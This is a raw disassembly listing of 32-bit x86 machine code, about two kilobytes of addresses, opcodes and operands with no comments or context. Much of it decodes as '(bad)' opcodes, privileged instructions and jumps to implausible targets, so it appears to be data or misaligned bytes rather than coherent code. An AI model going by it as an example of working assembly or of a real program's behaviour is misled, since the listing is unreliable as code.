  43129e:	outs   dx,BYTE PTR ds:[esi]
  43129f:	pushf  
  4312a0:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4312a6:	inc    DWORD PTR [ecx]
  4312a8:	inc    DWORD PTR [eax]
  4312aa:	jae    0x4312e4
  4312ac:	add    BYTE PTR [ebp+0x850266],al
  4312b2:	inc    DWORD PTR [ebp-0x1]
  4312b5:	mov    eax,eax
  4312b7:	jl     0x43131f
  4312b9:	add    BYTE PTR [ebp-0x740077],al
  4312bf:	cld    
  4312c0:	dec    eax
  4312c1:	add    BYTE PTR [eax],0x1
  4312c4:	data16 add BYTE PTR [ebp+0x38],al
  4312c8:	mov    eax,0x47c2
  4312cd:	mov    eax,0x824f89
  4312d2:	inc    edi
  4312d3:	mov    DWORD PTR [edx+0x64],ebp
  4312d6:	inc    WORD PTR [ebp-0x75]
  4312da:	(bad)  
  4312db:	data16 rol BYTE PTR [ebp-0x16001a],1
  4312e2:	inc    ebp
  4312e3:	jge    0x4312c4
  4312e5:	add    bh,ah
  4312e7:	lea    ax,[ebp-0x750030]
  4312ee:	add    al,0x46
  4312f1:	jmp    0x40ff:0x8885
  4312f7:	push   DWORD PTR [ebp+0x52]
  4312fa:	lea    eax,[eax]
  4312fc:	shl    BYTE PTR [esi-0x7b],1
  4312ff:	test   esi,edi
  431301:	(bad)  
  431302:	(bad)  
  431303:	inc    DWORD PTR [ebp-0x990140]
  431309:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43130f:	inc    edi
  431310:	push   ecx
  431311:	xor    ax,WORD PTR [ebp-0x8d0045]
  431318:	add    al,al
  43131a:	ret    
  43131b:	mov    ax,WORD PTR [ebp-0x3f0004]
  431322:	push   eax
  431323:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43132a:	add    BYTE PTR [ebx-0x764f8839],al
  431330:	push   DWORD PTR [esi+0x1]
  431333:	inc    DWORD PTR [eax]
  431335:	mov    eax,0xff99ff
  43133a:	or     BYTE PTR [ecx-0x7a87bb],cl
  431340:	jne    0x4312fa
  431342:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  43134c:	mov    ecx,0xd74fb8
  431351:	add    cl,al
  431353:	mov    DWORD PTR [ecx-0x3f007784],ecx
  431359:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431360:	(bad)  
  431361:	push   ebp
  431363:	mov    eax,0x8c2789
  431368:	ret    0x6689
  43136b:	adc    BYTE PTR [ebp+0x48],0x8d
  43136f:	add    bh,ah
  431371:	mov    WORD PTR [ebp-0x70],ax
  431375:	(bad)  
  431376:	ret    0x667d
  431379:	or     BYTE PTR [ebp-0x77],dl
  43137c:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431383:	loop   0x43130e
  431385:	(bad)  
  431386:	xchg   esi,eax
  431387:	aam    0xcf
  431389:	out    dx,al
  43138a:	mov    DWORD PTR [esi-0x68],edi
  43138d:	inc    ebp
  43138e:	dec    edx
  43138f:	pop    ecx
  431390:	mov    edx,DWORD PTR [eax]
  431392:	repnz push bp
  431395:	or     BYTE PTR [ebx+0x55106638],0x49
  43139c:	(bad)  
  43139d:	repnz xor eax,0xa0898945
  4313a3:	mov    ah,0x89
  4313a5:	jmp    DWORD PTR [edx+0x66b0418d]
  4313ab:	inc    DWORD PTR [ebp+0x50]
  4313ae:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4313b2:	mov    DWORD PTR [eax],ecx
  4313b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4313b5:	pop    es
  4313b6:	inc    ecx
  4313b7:	(bad)  
  4313b8:	data16 fwait
  4313ba:	inc    ebp
  4313bb:	xor    ah,BYTE PTR [esi+0x3]
  4313be:	dec    ebp
  4313bf:	push   eax
  4313c0:	inc    bp
  4313c2:	jge    0x431347
  4313c4:	mov    esp,DWORD PTR [esi-0x18]
  4313c7:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4313cd:	add    DWORD PTR [ebx],esi
  4313cf:	add    BYTE PTR [ebx],al
  4313d1:	test   DWORD PTR [ebx],esi
  4313d3:	(bad)  
  4313d4:	inc    WORD PTR [ebp+0x0]
  4313d8:	mov    eax,DWORD PTR [eax]
  4313da:	call   0x8898cb0f
  4313df:	mov    esi,eax
  4313e1:	clc    
  4313e2:	ret    
  4313e3:	rol    cl,0xa
  4313e6:	mov    DWORD PTR ds:0x7c0ec88,esi
  4313ec:	mov    edx,edi
  4313ee:	pushf  
  4313ef:	pop    es
  4313f0:	jmp    FWORD PTR [edx+0x66]
  4313f3:	add    BYTE PTR [ebp-0x990175],al
  4313f9:	inc    ebp
  4313fa:	test   DWORD PTR [ebx-0x2f00f202],eax
  431400:	push   ebp
  431401:	mov    edi,eax
  431403:	mov    dh,BYTE PTR [eax+0x266ff51]
  431409:	push   ebp
  43140a:	add    BYTE PTR [ebx-0x764b0777],al
  431410:	dec    DWORD PTR [esi+0x661851e8]
  431416:	add    BYTE PTR [ebp-0x7b],dl
  431419:	cmp    esi,0xfffffffb
  43141c:	dec    DWORD PTR [ecx+0x51fe9285]
  431422:	jmp    DWORD PTR [esi-0x75]
  431425:	push   ebp
  431426:	hlt    
  431427:	data16 (bad) 
  431429:	dec    ebp
  43142a:	ret    
  43142b:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431431:	lea    edx,[eax-0x1]
  431434:	jne    0x431407
  431436:	dec    DWORD PTR [ecx-0x2f7a63f8]
  43143c:	dec    BYTE PTR [ecx+0x51559eff]
  431442:	mov    DWORD PTR [esi-0x4c],esp
  431445:	push   ebp
  431446:	jmp    DWORD PTR [esi-0x18]
  431449:	inc    ebp
  43144a:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431450:	(bad)  
  431451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431452:	inc    eax
  431454:	test   DWORD PTR [esi-0x2],esp
  431457:	inc    ebp
  431458:	dec    DWORD PTR [ebp-0x760bde75]
  43145e:	(bad)  
  43145f:	test   al,0xc3
  431461:	mov    DWORD PTR [ebp-0x769b56],ecx
  431467:	lods   al,BYTE PTR ds:[esi]
  431468:	push   eax
  431469:	inc    ebp
  43146a:	jne    0x43147b
  43146c:	dec    DWORD PTR [ebp+0x8]
  43146f:	mov    ecx,DWORD PTR [ebx]
  431471:	sbb    al,0x0
  431473:	(bad)  
  431474:	mov    eax,0xc14fc3
  431479:	mov    DWORD PTR [ecx-0xbabf64],ecx
  43147f:	movsx  ecx,WORD PTR [ebp+0x4e]
  431483:	xor    eax,DWORD PTR [eax]
  431485:	add    eax,edi
  431487:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43148d:	xor    edi,DWORD PTR [eax+0x854f66]
  431493:	dec    BYTE PTR [ecx-0x76bb01]
  431499:	mov    BYTE PTR [ebx-0x76724001],al
  43149f:	pushf  
  4314a0:	inc    esi
  4314a1:	(bad)  
  4314a2:	dec    DWORD PTR [ebp-0x7abe6373]
  4314a8:	sar    esi,0x89
  4314ab:	dec    DWORD PTR [eax+0x0]
  4314ae:	inc    DWORD PTR [eax]
  4314b0:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4314b7:	xlat   BYTE PTR ds:[ebx]
  4314b8:	dec    edx
  4314b9:	add    bh,bh
  4314bb:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4314c1:	lea    esp,[esi-0x50]
  4314c4:	(bad)  
  4314c5:	(bad)  
  4314c6:	call   DWORD PTR [eax-0x1]
  4314c9:	inc    ebp
  4314ca:	rdpmc  
  4314cc:	add    BYTE PTR [ebx],al
  4314ce:	push   ax
  4314d0:	lea    eax,[ebp-0x1]
  4314d6:	js     0x4314d7
  4314d8:	add    al,bh
  4314da:	push   bp
  4314dc:	lea    ecx,[ebp-0x7701]
  4314e2:	fmul   DWORD PTR [ebp-0x7a997800]
  4314e8:	(bad)  
  4314e9:	(bad)  
  4314ea:	(bad)  
  4314eb:	(bad)  
  4314ec:	jmp    DWORD PTR [ecx-0x7676ffb3]
  4314f2:	dec    eax
  4314f3:	mov    eax,0x8d8dffff
  4314f8:	mov    al,0xb0
  4314fa:	(bad)  
  4314fb:	call   DWORD PTR [ecx+0x50]
  4314fe:	dec    ebp
  4314ff:	inc    ebp
  431500:	mov    esi,0x7030833
  431505:	push   eax
  431506:	into   
  431507:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43150d:	call   DWORD PTR [ecx-0x8]
  431510:	lea    edx,[ebp-0x1]
  431513:	jmp    0x761717
  431518:	inc    eax
  431519:	jnp    0x4314a8
  43151b:	add    dh,bh
  43151d:	inc    WORD PTR [ebp-0x8a00b0]
  431524:	mov    edx,eax
  431526:	inc    esp
  431527:	add    bh,bh
  431529:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  43152f:	dec    DWORD PTR [ebx-0x7f820301]
  431535:	add    BYTE PTR [ecx],al
  431537:	data16 add BYTE PTR [ebp-0xb30077],al
  43153e:	inc    eax
  431540:	(bad)  
  431541:	dec    si
  431543:	test   edi,edi
  431545:	(bad)  
  431546:	cmp    edi,edi
  431548:	add    ecx,DWORD PTR [edi-0x39]
  43154b:	mov    edx,DWORD PTR [edx+0x66]
  43154e:	inc    DWORD PTR [ebp-0x3d00cb]
  431554:	mov    eax,0x66ff8b5e
  43155a:	jmp    0xb4ff:0xc7ff3895
  431561:	push   ecx
  431562:	inc    DWORD PTR [ebx-0x76ffccbb]
  431568:	call   DWORD PTR [esi-0x1]
  43156b:	dec    DWORD PTR [eax]
  43156d:	mov    ecx,0x805ff
  431572:	inc    ebp
  431573:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  431579:	mov    ecx,0x35784
  43157e:	add    BYTE PTR [ecx-0xffa59b],cl
  431584:	inc    ebp
  431585:	mov    ecx,0x9c6131
  43158a:	(bad)  
  43158b:	mov    eax,ebx
  43158d:	pop    esp
  43158e:	test   edi,edi
  431590:	clc    
  431591:	lea    eax,[ebp-0x24]
  431594:	cmp    eax,0xc7fe9c8d
  431599:	push   eax
  43159b:	lea    eax,[ebp+0x45fff8fe]
  4315a1:	mov    esi,DWORD PTR [ecx]
  4315a3:	hlt    
  4315a4:	lahf   
  4315a5:	push   esp
  4315a6:	mov    edx,DWORD PTR [ecx-0x4]
  4315a9:	xor    eax,DWORD PTR [eax+0x7201bb]
  4315af:	add    BYTE PTR [ebp-0x35],al
  4315b2:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4315b8:	mov    edx,DWORD PTR [ecx-0x74]
  4315bb:	rol    BYTE PTR [eax],0x8d
  4315be:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4315c2:	nop
  4315c3:	push   ecx
  4315c4:	add    bh,bh
  4315c6:	mov    esp,edi
  4315c8:	in     al,0x85
  4315ca:	jge    0x4315ca
  4315cc:	test   edi,edi
  4315ce:	jne    0x431555
  4315d0:	(bad)  
  4315d1:	(bad)  
  4315d2:	sbb    bh,bh
  4315d4:	push   ebp
  4315d5:	inc    ebp
  4315d6:	call   0xffdc1066
  4315db:	add    BYTE PTR [ebp+0x66],al
  4315de:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4315e4:	cmp    al,0x85
  4315e6:	ud0    eax,DWORD PTR [ebp-0x1]
  4315ea:	test   DWORD PTR [edi+0x74],ecx
  4315ed:	dec    edi
  4315ee:	inc    DWORD PTR [ebp-0x530004]
  4315f4:	dec    DWORD PTR [edi-0x75]
  4315f7:	dec    esi
  4315f8:	cld    
  4315f9:	test   DWORD PTR [eax+0xff01ff],eax
  4315ff:	icebp  
  431600:	add    BYTE PTR [edi-0x3a],cl
  431603:	test   ebx,eax
  431605:	inc    BYTE PTR [ebp-0x1]
  431608:	jne    0x43160a
  43160a:	mov    eax,DWORD PTR [eax]
  43160c:	cld    
  43160d:	xor    BYTE PTR [ecx+0x500155],cl
  431613:	push   ebp
  431614:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43161a:	add    BYTE PTR [ebp+0x35e90f50],al
  431620:	add    al,BYTE PTR [eax]
  431622:	add    BYTE PTR [ebx-0x38fe4f80],al
  431628:	add    ah,ch
  43162a:	or     BYTE PTR [ebp+0x4501f845],dh
  431630:	jmp    0xdf1926
  431635:	(bad)  
  431636:	nop    ecx
  431639:	test   DWORD PTR [ebp+0x4502f8],eax
  43163f:	xor    ecx,DWORD PTR [ebp-0x64]
  431642:	mov    eax,edi
  431644:	mov    ebx,DWORD PTR [eax+edx*2]
  431647:	add    eax,0x45fef885
  43164c:	dec    DWORD PTR [ebx+0x339445]
  431652:	add    ecx,DWORD PTR [ecx+0x4500f889]
  431658:	dec    DWORD PTR [ebx-0x460f0375]
  43165e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43165f:	add    esi,edi
  431661:	add    bh,bh
  431663:	rdpmc  
  431665:	add    BYTE PTR [ebx],0x1
  431668:	mov    DWORD PTR [eax],eax
  43166a:	add    al,0x45
  43166c:	dec    DWORD PTR [ecx-0x360b3373]
  431672:	dec    DWORD PTR [esi]
  431674:	push   eax
  431675:	jne    0x4316bc
  431677:	mov    esi,DWORD PTR [ebx]
  431679:	cld    
  43167a:	add    esp,ecx
  43167c:	push   eax
  43167d:	inc    DWORD PTR [ebp-0x75]
  431680:	add    eax,0x800e4
  431685:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43168b:	mov    DWORD PTR [ecx],eax
  43168d:	sbb    al,0x0
  43168f:	leave  
  431690:	test   DWORD PTR [edi-0x2],eax
  431693:	jne    0x431694
  431695:	call   0xff44009a
  43169a:	xor    BYTE PTR [ebp+0x4d],al
  43169d:	mov    edi,edi
  43169f:	enter  0x8,0x4d
  4316a3:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4316a9:	mov    eax,DWORD PTR [eax]
  4316ab:	cld    
  4316ac:	add    DWORD PTR [ecx],ebx
  4316ae:	inc    ebp
  4316af:	dec    ebp
  4316b0:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4316b6:	inc    eax
  4316b7:	dec    DWORD PTR [ecx-0x270375]
  4316bd:	add    BYTE PTR [ebx-0x39d72701],cl
  4316c3:	xchg   ecx,eax
  4316c4:	ret    
  4316c5:	add    BYTE PTR [ebp-0x830075],al
  4316cb:	add    BYTE PTR [ebp-0x75],al
  4316ce:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4316d4:	lea    edi,[edi-0xc]
  4316d7:	add    bh,bh
  4316d9:	mov    edx,DWORD PTR [eax-0x7b]
  4316dc:	inc    ebp
  4316dd:	rdpmc  
  4316df:	jne    0x4316e4
  4316e1:	add    BYTE PTR [eax-0x75],dl
  4316e4:	inc    ebp
  4316e5:	clc    
  4316e6:	add    eax,0x400009
  4316eb:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4316f1:	mov    eax,DWORD PTR [ecx]
  4316f3:	in     al,dx
  4316f4:	add    dh,al
  4316f6:	test   ebx,eax
  4316f8:	inc    BYTE PTR [ebp-0xff0001]
  4316fe:	add    BYTE PTR [ebp-0x43],al
  431701:	cmp    esi,0xfffffff8
  431704:	(bad)  
  431705:	push   DWORD PTR [eax]
  431707:	add    BYTE PTR [ebp-0x3a],dl
  43170a:	test   ebx,eax
  43170c:	je     0x431693
  43170e:	mov    edi,edi
  431710:	sbb    al,0xff
  431712:	test   DWORD PTR gs:[eax],eax
  431715:	(bad)  
  431716:	js     0x431717
  431718:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43171e:	sub    eax,ebx
  431720:	mov    ecx,DWORD PTR [ebx-0x55130377]
  431726:	add    eax,DWORD PTR [eax]
  431728:	dec    ebp
  431729:	push   eax
  43172a:	mov    al,BYTE PTR [ebp+0x1]
  43172d:	mov    eax,DWORD PTR [ebp-0x68]
  431730:	mov    eax,DWORD PTR [eax]
  431732:	sbb    bh,al
  431734:	or     ah,dh
  431736:	dec    ebp
  431737:	inc    DWORD PTR [eax+0x4]
  43173a:	push   ecx
  43173b:	add    BYTE PTR [edx-0x1],dh
  43173e:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431744:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  43174e:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431754:	push   ecx
  431755:	cmp    BYTE PTR [ebx],al
  431757:	inc    ebp
  431758:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  43175e:	(bad)  
  43175f:	(bad)  
  431760:	in     al,0xff
  431762:	add    BYTE PTR [ebp+0x0],al
  431765:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43176b:	add    al,bh
  43176d:	(bad)  
  43176e:	jmp    0x8d85:0x74b0558d
  431775:	dec    DWORD PTR [eax]
  431777:	call   DWORD PTR [ebp-0x7b]
  43177a:	mov    edi,esi
  43177c:	lock call DWORD PTR [ebp-0x75]
  431780:	mov    esi,esp
  431782:	mov    ah,0xc6
  431784:	mov    bh,0xc3
  431786:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43178c:	add    DWORD PTR [eax],0x450050ff
  431792:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431798:	inc    edi
  43179a:	push   esp
  43179c:	jmp    0xcd00:0x650481ff
  4317a3:	mov    DWORD PTR [ebx],esi
  4317a5:	clc    
  4317a6:	cmp    edi,0xff9cff3c
  4317ac:	jne    0x4317b6
  4317ae:	mov    eax,eax
  4317b0:	add    esi,DWORD PTR [eax]
  4317b2:	int3   
  4317b3:	inc    ebp
  4317b4:	cmp    al,0x83
  4317b6:	add    BYTE PTR [eax],bl
  4317b8:	adc    DWORD PTR [ebx+0x768b5055],eax
  4317be:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4317c4:	mov    edi,eax
  4317c6:	cmp    BYTE PTR [ebp+0x45],cl
  4317c9:	jmp    0x431756
  4317cb:	mov    ebx,DWORD PTR [esp+ebp*8]
  4317ce:	inc    ebp
  4317cf:	or     al,0x2
  4317d1:	dec    DWORD PTR [ebp+0x18]
  4317d4:	jne    0x43182b
  4317d6:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4317dc:	mov    edi,DWORD PTR [ebx]
  4317de:	in     al,0x50
  4317e0:	xchg   ecx,eax
  4317e1:	jmp    0x34366e6
  4317e6:	adc    al,0x8b
  4317e8:	inc    ebp
  4317e9:	mov    al,ds:0x8b04008b
  4317ee:	push   ebp
  4317ef:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4317f5:	push   ebp
  4317f6:	test   DWORD PTR [ebx-0x2800d701],ecx
  4317fc:	inc    ebp
  4317fd:	dec    ebp
  4317fe:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431804:	mov    DWORD PTR [eax],0xe9ff00f4
  43180a:	add    al,0x0
  43180c:	add    BYTE PTR [eax],al
  43180e:	mov    eax,edx
  431810:	push   eax
  431811:	rol    DWORD PTR [ebp-0xf0177],1
  431817:	bound  eax,QWORD PTR [ebp+0x50]
  43181a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431820:	add    BYTE PTR [ecx+0x558df0ff],cl
  431826:	mov    al,0xf
  431828:	test   DWORD PTR [edx],edx
  43182a:	call   DWORD PTR [ebp-0x7a0001]
  431830:	(bad)  
  431831:	loop   0x431832
  431833:	jnp    0xc6990c39
  431839:	mov    eax,ebx
  43183b:	cmp    al,0x8b
  43183d:	(bad)  
  43183e:	cld    
  43183f:	shr    esi,0xc
  431842:	add    dl,al
  431844:	push   eax
  431845:	lea    eax,[ebp-0x1]
  431848:	mov    edx,esi
  43184a:	cwde   
  43184b:	cli    
  43184c:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431852:	or     BYTE PTR [eax],cl
  431854:	inc    ebp
  431855:	dec    ebp
  431856:	inc    DWORD PTR [ebx+0x74803914]
  43185c:	add    DWORD PTR [ebx+0x451800],ecx
  431862:	call   DWORD PTR [eax+edx*1]
  431865:	add    ecx,DWORD PTR [ebp-0x34]
  431868:	push   edi
  431869:	adc    al,0x8
  43186b:	mov    edx,DWORD PTR [ebp-0x14]
  43186e:	mov    ecx,DWORD PTR [ebp+0x18]
  431871:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431875:	inc    DWORD PTR [eax+esi*8]
  431878:	inc    ebp
  431879:	stos   BYTE PTR es:[edi],al
  43187a:	mov    edx,DWORD PTR [ebp-0x4]
  43187d:	add    DWORD PTR [ebp-0x1c],eax
  431880:	mov    edx,DWORD PTR [ebp-0x70]
  431883:	cmp    eax,DWORD PTR [eax]
  431885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431886:	mov    eax,DWORD PTR [eax]
  431888:	cld    
  431889:	jae    0x43180b
  43188b:	add    eax,DWORD PTR [ecx]
  43188d:	clc    
  43188e:	add    BYTE PTR [eax+0x30],dl
  431891:	mov    DWORD PTR [ecx],esi
  431893:	clc    
  431894:	pop    ds
  431895:	inc    ebp
  431896:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43189c:	(bad)  
  43189d:	push   DWORD PTR [edi]
  43189f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4318a5:	(bad)  
  4318a6:	jae    0x4318a7
  4318a8:	mov    eax,DWORD PTR [ebp-0x740175]
  4318ae:	sub    eax,DWORD PTR [eax]
  4318b0:	add    eax,DWORD PTR [eax]
  4318b2:	mov    DWORD PTR [ecx+0x5f],eax
  4318b5:	mov    DWORD PTR [ebx-0x4],ebx
  4318b8:	ret    0xff
  4318bb:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4318c1:	ret    
  4318c2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4318c8:	add    BYTE PTR [ebp-0x7d],al
  4318cb:	mov    DWORD PTR [eax],eax
  4318cd:	add    al,0x84
  4318cf:	inc    DWORD PTR [ecx]
  4318d1:	lea    eax,[eax]
  4318d3:	hlt    
  4318d4:	sar    bh,cl
  4318d6:	test   BYTE PTR [eax+0x1],dl
  4318d9:	inc    ebp
  4318da:	add    BYTE PTR [ebx],dh
  4318dc:	test   BYTE PTR [ebx],0x84
  4318df:	push   eax
  4318e0:	add    BYTE PTR [ebp+0x0],al
  4318e3:	add    eax,0x86
  4318e8:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4318ee:	add    BYTE PTR [ecx],al
  4318f0:	add    BYTE PTR [eax],al
  4318f2:	mov    esi,0x550030
  4318f7:	mov    ecx,DWORD PTR [edi]
  4318f9:	cld    
  4318fa:	fidiv  DWORD PTR [ebp+0x0]
  4318fd:	mov    edi,DWORD PTR [ecx]
  4318ff:	xor    BYTE PTR [eax+eax*1],0x84
  431903:	add    eax,DWORD PTR [eax]
  431905:	sbb    BYTE PTR [eax],al
  431907:	jne    0x4318ba
  431909:	mov    eax,DWORD PTR [ecx]
  43190b:	sbb    BYTE PTR [eax],al
  43190d:	mov    DWORD PTR [ebp-0x1],esp
  431910:	add    BYTE PTR [eax+0x30e45ca],bh
  431916:	ret    0xb7fc
  431919:	dec    ebp
  43191a:	or     al,0x89
  43191c:	dec    ebp
  43191d:	cld    
  43191e:	cmovne ecx,DWORD PTR [eax-0x75]
  431922:	add    edi,esp
  431924:	seto   BYTE PTR [esi-0x72ffffff]
  43192b:	inc    ebp
  43192c:	adc    al,0x8b
  43192e:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431935:	cmp    DWORD PTR [edi+0x72],edx
  431938:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  43193e:	gs cmp al,0x0
  431941:	je     0x431919
  431943:	push   eax
  431944:	sar    BYTE PTR [eax],1
  431946:	mov    bh,0x3e
  431948:	push   cs
  431949:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  43194f:	add    DWORD PTR [ecx+0x12],ebp
  431952:	dec    edx
  431953:	(bad)  
  431954:	mov    eax,edx
  431956:	in     al,dx
  431957:	adc    DWORD PTR [ecx],esi
  431959:	pop    esi
  43195a:	inc    ecx
  43195b:	leave  
  43195c:	or     DWORD PTR [eax],ebx
  43195e:	gs push ebp
  431960:	add    ah,ch
  431962:	into   
  431963:	in     al,dx
  431964:	enter  0xb756,0xf0
  431968:	push   cs
  431969:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431973:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431979:	jnp    0x74439e81
  43197f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431985:	add    BYTE PTR [edi],cl
  431987:	mov    edi,DWORD PTR [ecx-0x78]
  43198a:	ltr    WORD PTR [ecx-0x7b]
  43198e:	dec    DWORD PTR [edi]
  431990:	clc    
  431991:	out    0x45,eax
  431993:	add    BYTE PTR [eax],cl
  431995:	cmp    ebx,0xffffff8c
  431998:	jge    0x43199a
  43199a:	jb     0x4319ac
  43199c:	je     0x521a1c
  4319a2:	pop    edx
  4319a3:	push   esi
  4319a4:	mov    ecx,DWORD PTR [edi]
  4319a6:	in     al,dx
  4319a7:	rol    DWORD PTR [ebp+0x0],1
  4319aa:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  4319b1:	cmp    DWORD PTR [ecx],0xfffffff0
  4319b4:	hlt    
  4319b5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  4319bb:	(bad)  
  4319bd:	push   eax
  4319be:	jns    0xb842fe3c
  4319c4:	lock push cs
  4319c6:	ror    edx,0x3
  4319c9:	test   BYTE PTR [ecx+0x5500e800],cl
  4319cf:	dec    eax
  4319d0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  4319d4:	(bad)  
  4319d5:	mov    esi,0x7f33ff5f
  4319da:	inc    eax
  4319db:	test   DWORD PTR [edx],eax
  4319dd:	je     0x43199f
  4319df:	mov    ecx,ecx
  4319e1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  4319e5:	and    eax,DWORD PTR [eax+0xf0103]
  4319eb:	jp     0x4319d9
  4319ed:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  4319f1:	add    edx,DWORD PTR [edi+0x74]
  4319f4:	sbb    BYTE PTR [ebp+0x4d001484],cl
  4319fa:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a00:	je     0x431985
  431a02:	cmp    eax,edi
  431a04:	js     0x431a29
  431a06:	add    eax,0xeb0fc003
  431a0b:	jns    0x431998
  431a0d:	vmread DWORD PTR [ecx+0x45],ebx
  431a11:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431a17:	adc    al,0x8b
  431a19:	jge    0x431a2f
  431a1b:	mov    edi,DWORD PTR [eax-0x4]
  431a1e:	add    edi,DWORD PTR [edi]
  431a20:	or     bh,bh
  431a22:	push   ebp
  431a23:	push   es
  431a24:	mov    DWORD PTR [ebp-0x4],ebx
  431a27:	add    edi,esi
  431a29:	pop    es
  431a2a:	add    esi,DWORD PTR [edi-0x48ccf183]
  431a30:	mov    DWORD PTR [esp+esi*8],ecx
  431a33:	inc    ebp
  431a34:	pop    ebp
  431a35:	xor    DWORD PTR [esi-0x4],0x3b
  431a39:	add    edx,DWORD PTR [ecx+edi*1]
  431a3c:	push   es
  431a3d:	clc    
  431a3e:	mov    bh,0xdb
  431a40:	jp     0x4319f9
  431a42:	add    cl,BYTE PTR [esi]
  431a44:	div    DWORD PTR [edi+0x4d8b0c1c]
  431a4a:	test   edi,edi
  431a4c:	je     0x431a42
  431a4e:	mov    eax,ecx
  431a50:	or     BYTE PTR [ebx],al
  431a52:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431a58:	jbe    0x431acc
  431a5a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431a60:	add    ecx,DWORD PTR [esi]
  431a62:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431a68:	add    eax,DWORD PTR [ebx-0x287af783]
  431a6e:	je     0x431abd
  431a70:	mov    DWORD PTR [ecx],edi
  431a72:	mov    esi,eax
  431a74:	hlt    
  431a75:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431a7c:	jb     0x431a3e
  431a7e:	jmp    0x431a6b
  431a80:	xor    esi,DWORD PTR [ebx]
  431a82:	pop    edi
  431a83:	pop    esi
  431a84:	pop    ebx
  431a85:	ret    
  431a86:	ret    0x8b
  431a89:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431a8f:	xor    DWORD PTR [ecx],0xc
  431a92:	pushf  
  431a93:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431a99:	rdmsr  
  431a9b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431aa2:	dec    ebp
  431aa3:	ret    
  431aa4:	mov    edi,DWORD PTR [esi-0x4]
  431aa7:	pop    eax
  431aa8:	dec    ebp
  431aa9:	jne    0x431a36
  431aab:	xor    edi,esp
  431aad:	inc    eax
  431aae:	dec    ebp
  431aaf:	jbe    0x431b04
  431ab1:	inc    eax
  431ab2:	pop    ebp
  431ab3:	add    edx,DWORD PTR [esi+0x8]
  431ab6:	push   esp
  431ab7:	dec    eax
  431ab8:	push   ecx
  431ab9:	mov    eax,edi
  431abb:	and    al,0xf0
  431abd:	jo     0x431aaa
  431abf:	mov    eax,DWORD PTR [ebx]
  431ac1:	sbb    BYTE PTR [ebp+0x4d],cl
  431ac4:	mov    eax,DWORD PTR [ebx]
  431ac6:	nop
  431ac7:	or     BYTE PTR [eax],al
  431ac9:	jne    0x431b22
  431acb:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431ad1:	cld    
  431ad2:	xor    edi,edi
  431ad4:	add    edi,DWORD PTR [ebp+0x3]
  431ad7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431add:	js     0x431a63
  431adf:	jae    0x431ae3
  431ae1:	(bad)  
  431ae3:	xor    al,0x5d
  431ae5:	jmp    0x431a72
  431ae7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431aee:	fdecstp 
  431af0:	test   BYTE PTR [edi],ah
